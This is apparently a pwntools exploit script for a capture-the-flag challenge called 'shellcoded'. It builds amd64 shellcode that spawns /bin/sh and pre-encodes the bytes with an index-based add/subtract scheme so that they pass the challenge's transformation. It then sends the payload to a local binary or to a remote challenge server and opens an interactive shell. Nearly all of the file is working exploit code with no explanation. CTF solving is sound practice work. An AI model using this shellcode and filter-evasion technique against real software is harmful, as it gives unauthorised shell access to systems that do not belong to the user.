from pwn import *
context.arch = "amd64"

script = '''
        break *main+345
        continue
'''

def shellcode_filter(shellcode):
    j = 0
    for i in shellcode:
        if j&1:
            shellcode[j] = i + j
        else:
            shellcode[j] = i - j
        j+=1
    return bytes(shellcode)

def shellcode_generator():
    shellcode = asm('''
                    jmp main
                sys:
                    syscall
                main:
                    xor rdx, rdx
                    xor rsi, rsi
                    mov rbx,0x0068732f6e69622f
                    push rbx
                    push rsp
                    pop rdi
                    mov al, 59
                    je sys
            ''')

    shellcode = list(shellcode)
    return shellcode_filter(shellcode)

shellcode = shellcode_generator()

flag = True

if flag:
    p = process("./shellcoded")
    #gdb.attach(p,script)
else:
    p = remote("challenge.ctf.games",32383)

p.recv()
p.send(shellcode)
p.interactive()